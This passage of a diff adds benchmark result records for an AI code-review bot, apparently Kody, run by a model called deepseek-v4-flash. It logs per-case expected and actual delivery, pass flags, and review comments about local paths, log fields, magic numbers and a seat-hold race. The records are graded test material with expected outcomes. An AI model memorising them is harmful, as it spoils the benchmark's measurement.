+        }
+      ],
+      "claims": [
+        {
+          "id": "local-path-fixture-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "local-path-fixture-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "medium",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P05-rule-local-path-fixture-touched",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 3194,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [],
+      "repeatCheck": {
+        "model": "not-needed"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [],
+      "claims": [
+        {
+          "id": "local-path-fixture-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "local-path-fixture-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": false
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P05-rule-local-path-fixture-touched",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 23270,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "tests/conftest.py",
+          "line": 10,
+          "label": "kody_rules",
+          "earlierId": "round-a-P05-rule-local-path-fixture-touched",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P05-rule-local-path-fixture-touched",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "tests/conftest.py",
+          "line": 18,
+          "severity": "medium",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-local-machine-paths"
+          ],
+          "marked": false,
+          "text": "Because `archive_dir` points at `/Users/dev/billing-archive`, a path that only exists on the original developer's machine, any fixture that archives invoices will fail on CI or write outside the repo, breaking the rule \"No local machine paths in committed files\". Use a temporary directory such as pytest's `tmp_path` or a repository-relative path instead."
+        }
+      ],
+      "claims": [
+        {
+          "id": "local-path-fixture-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "local-path-fixture-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "medium",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P05-rule-local-path-fixture-touched",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 19130,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "tests/conftest.py",
+          "line": 10,
+          "label": "kody_rules",
+          "earlierId": "round-a-P05-rule-local-path-fixture-touched",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "tests/conftest.py",
+          "line": 18,
+          "severity": "medium",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-local-machine-paths"
+          ],
+          "marked": false,
+          "text": "`archive_dir` is hardcoded to `/Users/dev/billing-archive`, which violates the rule against local machine paths in committed files and breaks the fixture on any other machine. Use pytest's `tmp_path` (or another temp directory) so the fixture works anywhere."
+        }
+      ],
+      "claims": [
+        {
+          "id": "local-path-fixture-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "local-path-fixture-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "medium",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P05-rule-local-path-fixture-touched",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 20652,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "tests/conftest.py",
+          "line": 10,
+          "label": "kody_rules",
+          "earlierId": "round-a-P05-rule-local-path-fixture-touched",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P05-rule-local-path-fixture-touched",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 1,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "tests/conftest.py",
+          "line": 18,
+          "severity": "high",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-local-machine-paths"
+          ],
+          "marked": false,
+          "text": "The hardcoded `/Users/dev/billing-archive` path violates the rule against local machine paths in committed files and will not exist on CI or another machine. Use pytest's `tmp_path` fixture, or a repository-relative directory, for `archive_dir`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "local-path-fixture-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "local-path-fixture-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "high",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P13-rule-log-operation-still-missing",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 14857,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/payouts/settle.go",
+          "line": 28,
+          "label": "kody_rules",
+          "earlierId": "round-a-P13-rule-log-operation-still-missing",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/payouts/notify.go",
+          "line": 9,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-log-operation-field"
+          ],
+          "marked": false,
+          "text": "Without an operation field, this \"payout settled\" log line cannot be grouped with the rest of the payout flow in the log dashboards. Add `slog.String(\"operation\", \"payout.notify_settled\")` to the `InfoContext` call so it satisfies \"Log calls name the operation\"."
+        }
+      ],
+      "claims": [
+        {
+          "id": "log-operation-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "success-log-operation-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P13-rule-log-operation-still-missing",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 10550,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/payouts/settle.go",
+          "line": 26,
+          "label": "kody_rules",
+          "earlierId": "round-a-P13-rule-log-operation-still-missing",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/payouts/notify.go",
+          "line": 9,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-log-operation-field"
+          ],
+          "marked": false,
+          "text": "Without an operation field, this \"payout settled\" event cannot be grouped with the rest of the settle flow in the log dashboards, breaking the rule that log calls name the operation. Add `slog.String(\"operation\", \"payout.settle\")` to this `InfoContext` call so the log records the operation in progress."
+        }
+      ],
+      "claims": [
+        {
+          "id": "log-operation-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "success-log-operation-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P13-rule-log-operation-still-missing",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 22750,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/payouts/settle.go",
+          "line": 26,
+          "label": "kody_rules",
+          "earlierId": "round-a-P13-rule-log-operation-still-missing",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/payouts/notify.go",
+          "line": 9,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-log-operation-field"
+          ],
+          "marked": false,
+          "text": "Without an operation field this event cannot be grouped with the rest of the settle flow in the log dashboards, breaking the rule that log calls name the operation. Add `slog.String(\"operation\", \"payout.settle\")` to the `InfoContext` call so the operation is named."
+        }
+      ],
+      "claims": [
+        {
+          "id": "log-operation-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "success-log-operation-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P13-rule-log-operation-still-missing",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 16571,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/payouts/settle.go",
+          "line": 26,
+          "label": "kody_rules",
+          "earlierId": "round-a-P13-rule-log-operation-still-missing",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/payouts/notify.go",
+          "line": 9,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-log-operation-field"
+          ],
+          "marked": false,
+          "text": "Without an `operation` field this settlement notification cannot be grouped with the rest of the payout flow in the log dashboards, breaking the rule that log calls name the operation. Add `slog.String(\"operation\", \"payout.notifySettled\")` (or the appropriate operation name for this flow) to the `InfoContext` call."
+        }
+      ],
+      "claims": [
+        {
+          "id": "log-operation-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "success-log-operation-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P13-rule-log-operation-still-missing",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 12393,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/payouts/settle.go",
+          "line": 28,
+          "label": "kody_rules",
+          "earlierId": "round-a-P13-rule-log-operation-still-missing",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": "round-a-P13-rule-log-operation-still-missing",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/payouts/notify.go",
+          "line": 9,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-log-operation-field"
+          ],
+          "marked": false,
+          "text": "The `payout settled` log call lacks an `operation` field, so this settled notification cannot be grouped with the rest of the payout flow in the log dashboards and breaks the rule that log calls name the operation. Add `slog.String(\"operation\", \"payout.settle\")` to this `InfoContext` call."
+        }
+      ],
+      "claims": [
+        {
+          "id": "log-operation-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "success-log-operation-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P21-rule-unit-constants-out-of-40",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 21433,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 29,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/uploads/cleanup.go",
+          "line": 20,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-magic-numbers"
+          ],
+          "marked": false,
+          "text": "The inline 72-hour retention period in `internal/uploads/cleanup.go` violates rule [1] \"Name magic numbers and units\". Define `staleUploadRetention` as `72 * time.Hour` and use it here so the retention policy is documented in one place."
+        }
+      ],
+      "claims": [
+        {
+          "id": "avatar-size-literal-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "staging-retention-literal-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P21-rule-unit-constants-out-of-40",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 20844,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 29,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        },
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 30,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/uploads/cleanup.go",
+          "line": 20,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-magic-numbers"
+          ],
+          "marked": false,
+          "text": "The inline `72 * time.Hour` in `internal/uploads/cleanup.go` leaves the retention duration and its unit buried in the logic, so any adjustment means hunting through the code. Extract it into a named constant such as `abandonedUploadRetention = 72 * time.Hour` so the value and unit are explicit and adjustable in one place."
+        }
+      ],
+      "claims": [
+        {
+          "id": "avatar-size-literal-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "staging-retention-literal-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P21-rule-unit-constants-out-of-40",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 13483,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 29,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        },
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 30,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/uploads/cleanup.go",
+          "line": 20,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-magic-numbers"
+          ],
+          "marked": false,
+          "text": "Because the 72-hour retention period is written inline, the cleanup policy is undocumented and easy to miss when it changes. Define it as a constant named `abandonedUploadTTL` and use that constant in the `now.Add` call."
+        }
+      ],
+      "claims": [
+        {
+          "id": "avatar-size-literal-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "staging-retention-literal-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P21-rule-unit-constants-out-of-40",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 16306,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 29,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        },
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 30,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/uploads/cleanup.go",
+          "line": 20,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-magic-numbers"
+          ],
+          "marked": false,
+          "text": "The abandoned-upload retention window is represented by the inline literal 72, so its meaning is hidden and it does not satisfy rule [1]'s requirement that the duration be named. Define a named constant such as `const abandonedUploadTTL = 72 // hours` near `tmpPrefix` and use `now.Add(-abandonedUploadTTL * time.Hour)`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "avatar-size-literal-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "staging-retention-literal-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P21-rule-unit-constants-out-of-40",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 13369,
+      "indexRefs": 0,
+      "verificationEvidence": [],
+      "alreadyPosted": [
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 29,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        },
+        {
+          "file": "internal/uploads/avatar.go",
+          "line": 30,
+          "label": "kody_rules",
+          "earlierId": "round-a-P21-rule-unit-constants-out-of-40",
+          "earlierOutcome": "not_implemented",
+          "revisesSuggestionId": null,
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 2,
+      "sandboxFailed": 0,
+      "warnings": 0,
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "internal/uploads/cleanup.go",
+          "line": 20,
+          "severity": "low",
+          "linkedById": false,
+          "label": "kody_rules",
+          "brokenKodyRulesIds": [
+            "rule-no-magic-numbers"
+          ],
+          "marked": false,
+          "text": "The inline `72 * time.Hour` hides the retention unit and makes the value hard to change consistently. Define `staleUploadRetention` as `72 * time.Hour` and use it in the `now.Add` call so the quantity and unit are explicit and configurable in one place."
+        }
+      ],
+      "claims": [
+        {
+          "id": "avatar-size-literal-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        },
+        {
+          "id": "staging-retention-literal-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "low",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P29-hold-leak-on-create",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 109983,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: changeSeat's new catch calls holds.release(hold) unconditionally, but the try block commits the hold (line 26) before freeing the old seat (line 27), so a failure in holds.free triggers release on an already-committed hold. WHY: the booking row was already updated to newSeatId, yet its hold is now released, letting another user acquire/book the same seat (double-booking) while the old seat stays blocked. HOW: only release while the hold has not yet been committed, e.g. track a `committed` flag and `if (!committed) await this.holds.release(hold);` in the catch.",
+          "keep": true,
+          "rationale": "The code matches the claim exactly: changeSeat's try block calls holds.commit(hold) at line 26 and then holds.free(booking.seatId) at line 27, and the catch unconditionally calls holds.release(hold) at line 30. Nothing guards against release being invoked after commit. The failure path is real: free() is a promise-returning I/O operation with no upstream guard, so if it rejects after commit, release runs on an already-committed hold. Since commit() marks the seat as taken for the booking (which already points at newSeatId), releasing that hold can end the seat's taken-state, allowing another user to acquire/book the same seat while the old seat stays blocked (free failed). The SeatHolds interface (src/bookings/seat-holds.ts) does not define release-after-commit as a no-op, so I cannot refute the harmful outcome. This is also a distinct problem introduced by applying the earlier hold-leak suggestion (round-a-P29-hold-leak-on-create), which added the unconditional release catch — not a repeat of that finding.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "release|commit|free|acquire",
+                "glob": "**/holds*.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "implements SeatHolds|class .*SeatHolds|commit\\(|release\\(|free\\(",
+                "glob": "**/*.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "claim": "WHAT: book() acquires a seat hold (line 15) but does not wrap the subsequent payments.charge/ repo.insert/ holds.commit in try/catch, so when the card is declined or the insert fails the hold is never released. WHY: holds never expire (src/bookings/seat-holds.ts:5), so a declined payment or failed insert permanently blocks the seat for every other user — the leak the comment on line 12 falsely claims is handled. HOW: wrap the operations after acquire in try/catch and release the hold on failure, mirroring changeSeat/addGuest: `const hold = await this.holds.acquire(seatId, userId); try { const charge = await this.payments.charge(userId, priceCents); const booking = await this.repo.insert({ userId, seatId, chargeId: charge.id, guests: [] }); await this.holds.commit(hold); return booking; } catch (err) { await this.holds.release(hold); throw err; }`.",
+          "keep": true,
+          "rationale": "The technical claim is factually confirmed by the current code. book() at src/bookings/bookings.service.ts:15 acquires a hold, then calls payments.charge (16), repo.insert (17), and holds.commit (18) with no try/catch, so any failure leaks the hold. seat-holds.ts:5 explicitly states holds never expire (\"only commit() or release() ends one\"), and changeSeat/addGuest both wrap their post-acquire work in try/catch with holds.release(hold) on error — proving the fix pattern exists but was NOT applied to book. The comment on line 12 (\"book releases the hold when the card is declined or the insert fails\") is demonstrably false against the code. Although a prior review decision (round-a-P29-hold-leak-on-create) is marked \"implemented\", the current diff provides concrete evidence the applied change is incomplete/wrong for book: only changeSeat and addGuest were fixed, book was left unchanged. That is exactly the \"concrete evidence the applied change is wrong\" that blocks dropping under the PreviousReviewDecisions rule, so the finding stands.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/bookings.service.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/bookings/seat-holds.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [
+        {
+          "file": "src/bookings/bookings.service.ts",
+          "line": 13,
+          "label": "bug",
+          "earlierId": "round-a-P29-hold-leak-on-create",
+          "earlierOutcome": "implemented",
+          "revisesSuggestionId": "round-a-P29-hold-leak-on-create",
+          "by": "model"
+        }
+      ],
+      "repeatCheck": {
+        "model": "ok"
+      },
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/bookings/bookings.service.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": true,
+          "revisesSuggestionId": "round-a-P29-hold-leak-on-create",
+          "label": "bug",
+          "marked": false,
+          "text": "**Revises an earlier Kody suggestion** on `src/bookings/bookings.service.ts:13` (2026-10-06 12:00 UTC).\n\nOnce `holds.commit(hold)` succeeds (line 26), a failure in `holds.free(booking.seatId)` (line 27) still calls `holds.release(hold)` on an already-committed hold, so the booking row points at `newSeatId` while the hold is released, letting another user acquire the same seat (double-booking) while the old seat stays blocked. Track a `committed` flag and only run `await this.holds.release(hold)` in the catch when the hold has not yet been committed."
+        }
+      ],
+      "claims": [
+        {
+          "id": "book-hold-leak-repeat",
+          "expect": "not_deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": false,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": null,
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P29-hold-leak-on-create",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 239550,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
